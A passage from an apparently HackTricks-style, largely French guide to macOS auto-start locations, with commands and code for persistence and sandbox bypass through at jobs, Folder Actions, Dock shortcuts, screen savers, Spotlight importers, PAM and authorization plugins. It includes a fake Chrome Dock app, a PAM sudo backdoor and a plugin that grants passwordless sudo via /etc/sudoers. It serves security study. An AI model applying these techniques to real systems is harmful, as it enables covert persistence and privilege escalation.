PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Si les tâches AT ne sont pas activées, les tâches créées ne seront pas exécutées.

Les **job files** se trouvent dans `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Le nom du fichier contient la file d'attente, le numéro du job et l'heure à laquelle il est programmé. Par exemple, examinons `a0001a019bdcd2`.

- `a` - c'est la file d'attente
- `0001a` - numéro de job en hex, `0x1a = 26`
- `019bdcd2` - temps en hex. Il représente le nombre de minutes écoulées depuis l'epoch. `0x019bdcd2` vaut `26991826` en décimal. Si on le multiplie par 60 on obtient `1619509560`, ce qui correspond à `GMT: 2021. April 27., Tuesday 7:46:00`.

Si on affiche le fichier du job, on constate qu'il contient les mêmes informations que celles obtenues avec `at -c`.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Utile pour contourner le sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mais vous devez pouvoir appeler `osascript` avec des arguments pour contacter **`System Events`** afin de pouvoir configurer Folder Actions
- Contournement de TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Il dispose de certaines autorisations TCC de base comme Desktop, Documents and Downloads

#### Emplacement

- **`/Library/Scripts/Folder Action Scripts`**
- Root requis
- **Déclencheur** : Accès au dossier spécifié
- **`~/Library/Scripts/Folder Action Scripts`**
- **Déclencheur** : Accès au dossier spécifié

#### Description & Exploitation

Folder Actions sont des scripts déclenchés automatiquement par des changements dans un dossier, comme l'ajout ou la suppression d'éléments, ou d'autres actions comme l'ouverture ou le redimensionnement de la fenêtre du dossier. Ces actions peuvent être utilisées pour diverses tâches, et peuvent être déclenchées de différentes manières, par exemple via le Finder UI ou des commandes Terminal.

Pour configurer Folder Actions, vous avez plusieurs options :

1. Créer un workflow Folder Action avec [Automator](https://support.apple.com/guide/automator/welcome/mac) et l'installer comme service.
2. Attacher un script manuellement via le Folder Actions Setup dans le menu contextuel d'un dossier.
3. Utiliser OSAScript pour envoyer des Apple Event à `System Events.app` afin de configurer programmaticalement une Folder Action.
- Cette méthode est particulièrement utile pour intégrer l'action dans le système, offrant un niveau de persistance.

Le script suivant est un exemple de ce qui peut être exécuté par une Folder Action:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Pour rendre le script ci‑dessus utilisable par Folder Actions, compilez‑le en utilisant :
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Après la compilation du script, configurez Folder Actions en exécutant le script ci-dessous. Ce script activera Folder Actions globalement et associera spécifiquement le script compilé précédemment au dossier Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Exécutez le script d'installation avec :
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Voici la façon d'implémenter cette persistence via GUI :

Voici le script qui sera exécuté :
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Compilez-le avec : `osacompile -l JavaScript -o folder.scpt source.js`

Déplacez-le vers :
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Then, open the `Folder Actions Setup` app, select the **folder you would like to watch** and select in your case **`folder.scpt`** (in my case I called it output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Now, if you open that folder with **Finder**, your script will be executed.

This configuration was stored in the **plist** located in **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** in base64 format.

Now, lets try to prepare this persistence without GUI access:

1. **Copy `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** to `/tmp` to backup it:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Remove** the Folder Actions you just set:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Now that we have an empty environment

3. Copy the backup file: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Open the Folder Actions Setup.app to consume this config: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Et cela n'a pas fonctionné pour moi, mais ce sont les instructions du writeup:(

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- But you need to have installed a malicious application inside the system
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: When the user clicks on the app inside the dock

#### Description & Exploitation

All the applications that appear in the Dock are specified inside the plist: **`~/Library/Preferences/com.apple.dock.plist`**

It's possible to **add an application** just with:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
En utilisant un peu de **social engineering**, vous pourriez **vous faire passer, par exemple, pour Google Chrome** dans le dock et exécuter réellement votre propre script:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Sélecteurs de couleur

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Utile pour contourner le sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Une action très spécifique doit se produire
- Vous vous retrouverez dans un autre sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- `/Library/ColorPickers`
- Root requis
- Déclencheur : utiliser le sélecteur de couleur
- `~/Library/ColorPickers`
- Déclencheur : utiliser le sélecteur de couleur

#### Description & Exploit

**Compilez un bundle de sélecteur de couleur** contenant votre code (vous pouvez utiliser [**this one for example**](https://github.com/viktorstrate/color-picker-plus)) et ajoutez un constructor (comme dans la [Screen Saver section](macos-auto-start-locations.md#screen-saver)) puis copiez le bundle dans `~/Library/ColorPickers`.

Ensuite, lorsque le sélecteur de couleur est déclenché, votre code devrait également s'exécuter.

Notez que le binaire chargeant votre bibliothèque a un **sandbox très restrictif** : `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Utile pour contourner le sandbox : **Non, car vous devez exécuter votre propre app**
- TCC bypass: ???

#### Location

- Une application spécifique

#### Description & Exploit

Un exemple d'application avec une Finder Sync Extension [**est disponible ici**](https://github.com/D00MFist/InSync).

Les applications peuvent avoir des `Finder Sync Extensions`. Cette extension ira à l'intérieur d'une application qui sera exécutée. De plus, pour que l'extension puisse exécuter son code, elle **doit être signée** avec un certificat développeur Apple valide, elle doit être **sandboxée** (bien que des exceptions assouplies puissent être ajoutées) et elle doit être enregistrée avec quelque chose comme :
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Writeup : [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup : [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Utile pour bypass le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
- Mais vous vous retrouverez dans un sandbox d'application classique
- TCC bypass : [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/System/Library/Screen Savers`
- Root required
- **Trigger** : Sélectionner le screen saver
- `/Library/Screen Savers`
- Root required
- **Trigger** : Sélectionner le screen saver
- `~/Library/Screen Savers`
- **Trigger** : Sélectionner le screen saver

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Description & Exploit

Créez un nouveau projet dans Xcode et sélectionnez le template pour générer un nouveau **Screen Saver**. Ensuite, ajoutez votre code, par exemple le code suivant pour générer des logs.

**Build** it, and copy the `.saver` bundle to **`~/Library/Screen Savers`**. Then, open the Screen Saver GUI and it you just click on it, it should generate a lot of logs:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Notez que, puisque dans les entitlements du binaire qui charge ce code (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) vous pouvez trouver **`com.apple.security.app-sandbox`**, vous serez **inside the common application sandbox**.

Code de l'économiseur d'écran:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Utile pour bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mais vous vous retrouverez dans une application sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Le sandbox semble très limité

#### Location

- `~/Library/Spotlight/`
- **Trigger**: Un nouveau fichier avec une extension gérée par le Spotlight plugin est créé.
- `/Library/Spotlight/`
- **Trigger**: Un nouveau fichier avec une extension gérée par le Spotlight plugin est créé.
- Root required
- `/System/Library/Spotlight/`
- **Trigger**: Un nouveau fichier avec une extension gérée par le Spotlight plugin est créé.
- Root required
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Un nouveau fichier avec une extension gérée par le Spotlight plugin est créé.
- Nouvelle app requise

#### Description & Exploitation

Spotlight est la fonctionnalité de recherche intégrée de macOS, conçue pour fournir aux utilisateurs **un accès rapide et complet aux données sur leurs ordinateurs**.\
Pour faciliter cette capacité de recherche rapide, Spotlight maintient une **base de données propriétaire** et crée un index en **analysant la plupart des fichiers**, permettant des recherches rapides à la fois par noms de fichiers et par contenu.

Le mécanisme sous-jacent de Spotlight implique un processus central nommé 'mds', qui signifie **'metadata server'.** Ce processus orchestre l'ensemble du service Spotlight. En complément, il existe plusieurs démons 'mdworker' qui effectuent diverses tâches de maintenance, comme l'indexation de différents types de fichiers (`ps -ef | grep mdworker`). Ces tâches sont rendues possibles par Spotlight importer plugins, or **".mdimporter bundles**", qui permettent à Spotlight de comprendre et d'indexer le contenu d'un large éventail de formats de fichiers.

Les plugins ou bundles **`.mdimporter`** se trouvent aux emplacements mentionnés précédemment et si un nouveau bundle apparaît, il est chargé en moins d'une minute (pas besoin de redémarrer un service). Ces bundles doivent indiquer quel **type de fichier et quelles extensions ils peuvent gérer**, ainsi Spotlight les utilisera lorsqu'un nouveau fichier avec l'extension indiquée est créé.

Il est possible de **trouver tous les `mdimporters`** chargés en exécutant:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Par exemple, **/Library/Spotlight/iBooksAuthor.mdimporter** est utilisé pour analyser ce type de fichiers (extensions `.iba` et `.book` entre autres) :
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Si vous examinez le Plist d'autres `mdimporter`, vous pourriez ne pas trouver l'entrée **`UTTypeConformsTo`**. C'est parce que c'est un _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) intégré et qu'il n'est pas nécessaire de spécifier des extensions.
>
> De plus, les plugins système par défaut prennent toujours la priorité, donc un attaquant ne peut accéder qu'aux fichiers qui ne sont pas déjà indexés par les propres `mdimporters` d'Apple.

Pour créer votre propre importer vous pouvez commencer avec ce projet: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) et ensuite changer le nom, le **`CFBundleDocumentTypes`** et ajouter **`UTImportedTypeDeclarations`** afin qu'il prenne en charge l'extension que vous souhaitez supporter et les refléter dans **`schema.xml`**.\
Puis **changez** le code de la fonction **`GetMetadataForFile`** pour exécuter votre payload lorsqu'un fichier avec l'extension traitée est créé.

Enfin **construisez et copiez votre nouveau `.mdimporter`** dans l'un des trois emplacements précédents et vous pouvez vérifier s'il est chargé en **surveillant les logs** ou en exécutant **`mdimport -L`**.

### ~~Panneau de Préférences~~

> [!CAUTION]
> Il semble que cela ne fonctionne plus.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Utile pour bypasser le sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Nécessite une action spécifique de l'utilisateur
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

Il semble que cela ne fonctionne plus.

## Root Sandbox Bypass

> [!TIP]
> Vous trouverez ici des emplacements de démarrage utiles pour le **sandbox bypass** qui permettent d'exécuter simplement quelque chose en **écrivant dans un fichier** en étant **root** et/ou nécessitant d'autres **conditions étranges.**

### Périodique

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Utile pour bypasser le sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mais vous devez être root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root requis
- **Déclencheur** : Au moment prévu
- `/etc/daily.local`, `/etc/weekly.local` or `/etc/monthly.local`
- Root requis
- **Déclencheur** : Au moment prévu

#### Description & Exploitation

Les scripts périodiques (**`/etc/periodic`**) sont exécutés à cause des **launch daemons** configurés dans `/System/Library/LaunchDaemons/com.apple.periodic*`. Remarque : les scripts stockés dans `/etc/periodic/` sont exécutés avec l'identité du propriétaire du fichier, donc cela ne conviendra pas pour une éventuelle privilege escalation.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
D'autres scripts périodiques qui seront exécutés sont indiqués dans **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Si vous parvenez à écrire l'un des fichiers `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local`, il sera **exécuté tôt ou tard**.

> [!WARNING]
> Notez que le script périodique sera **exécuté en tant que propriétaire du script**. Donc si un utilisateur régulier possède le script, il sera exécuté en tant que cet utilisateur (cela peut empêcher des privilege escalation attacks).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Utile pour bypasser sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mais vous devez être root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Root toujours requis

#### Description & Exploitation

Puisque PAM est davantage axé sur la **persistence** et le malware que sur une exécution facile dans macOS, ce blog ne donnera pas d'explication détaillée, **lisez les writeups pour mieux comprendre cette technique**.

Vérifiez les modules PAM avec:
```bash
ls -l /etc/pam.d
```
Une technique de persistence/privilege escalation exploitant PAM consiste simplement à modifier le module /etc/pam.d/sudo en ajoutant au début la ligne :
```bash
auth       sufficient     pam_permit.so
```
Donc, cela **ressemblera** à ceci :
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Et par conséquent, toute tentative d'utiliser **`sudo` fonctionnera**.

> [!CAUTION]
> Notez que ce répertoire est protégé par TCC, il est donc très probable que l'utilisateur reçoive une invite lui demandant l'accès.

Un autre bon exemple est su, où vous pouvez voir qu'il est aussi possible de fournir des paramètres aux modules PAM (et vous pourriez aussi backdoor ce fichier) :
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Utile pour contourner le sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mais il faut être root et effectuer des configurations supplémentaires
- TCC bypass: ???

#### Emplacement

- `/Library/Security/SecurityAgentPlugins/`
- Nécessite root
- Il est aussi nécessaire de configurer l'authorization database pour utiliser le plugin

#### Description & Exploitation

Vous pouvez créer un authorization plugin qui sera exécuté lorsqu'un utilisateur se connecte pour maintenir la persistence. Pour plus d'informations sur la création de l'un de ces plugins, consultez les writeups précédents (et soyez prudent : un plugin mal écrit peut vous bloquer l'accès et vous devrez nettoyer votre mac depuis le recovery mode).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Déplacez** le bundle vers l'emplacement où il sera chargé:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Enfin, ajoutez la **règle** pour charger ce Plugin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Le **`evaluate-mechanisms`** indiquera au framework d'autorisation qu'il devra **appeler un mécanisme externe pour l'autorisation**. De plus, **`privileged`** fera en sorte qu'il soit exécuté par root.

Déclenchez-le avec :
```bash
security authorize com.asdf.asdf
```
Et ensuite le groupe **staff** devrait avoir un accès sudo (lire `/etc/sudoers` pour confirmer).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Utile pour contourner le sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mais il faut être root et l'utilisateur doit utiliser man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- **`/private/etc/man.conf`**
- Nécessite root
- **`/private/etc/man.conf`**: Chaque fois que man est utilisé

#### Description & Exploit

Le fichier de configuration **`/private/etc/man.conf`** indique le binaire/script à utiliser lors de l'ouverture des pages de manuel. Ainsi, le chemin vers l'exécutable peut être modifié de sorte que, chaque fois que l'utilisateur utilise man pour lire de la documentation, une backdoor soit exécutée.

Par exemple, placer dans **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
Ensuite, créez `/tmp/view` comme :
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Utile pour bypasser la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mais vous devez être root et apache doit être en cours d'exécution
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd n'a pas d'entitlements

#### Emplacement

- **`/etc/apache2/httpd.conf`**
- Requiert les privilèges root
- Déclencheur : lorsque Apache2 est démarré

#### Description & Exploit

Vous pouvez indiquer dans `/etc/apache2/httpd.conf` de charger un module en ajoutant une ligne telle que:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
De cette façon, votre module compilé sera chargé par Apache. La seule chose est que soit vous devez **le signer avec un certificat Apple valide**, soit vous devez **ajouter un nouveau certificat de confiance** dans le système et **le signer** avec celui-ci.

Ensuite, si nécessaire, pour vous assurer que le serveur sera démarré, vous pouvez exécuter :
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Exemple de code pour le Dylb :
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Utile pour bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mais vous devez être root, auditd doit être en cours d'exécution et provoquer un avertissement
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- **`/etc/security/audit_warn`**
- Requiert root
- **Déclencheur** : Lorsque auditd détecte un avertissement

#### Description & Exploit

Chaque fois qu'auditd détecte un avertissement, le script **`/etc/security/audit_warn`** est **exécuté**. Vous pouvez donc y ajouter votre payload.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Vous pouvez provoquer un avertissement avec `sudo audit -n`.

### Éléments de démarrage

> [!CAUTION] > **Ceci est obsolète, donc rien ne devrait être trouvé dans ces répertoires.**

Le **StartupItem** est un répertoire qui doit être placé soit dans `/Library/StartupItems/`, soit dans `/System/Library/StartupItems/`. Une fois ce répertoire créé, il doit contenir deux fichiers spécifiques :

1. Un **rc script** : un script shell exécuté au démarrage.
2. Un **plist file**, nommé spécifiquement `StartupParameters.plist`, qui contient divers paramètres de configuration.

Assurez-vous que le rc script et le fichier `StartupParameters.plist` sont correctement placés à l'intérieur du répertoire **StartupItem** pour que le processus de démarrage puisse les reconnaître et les utiliser.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
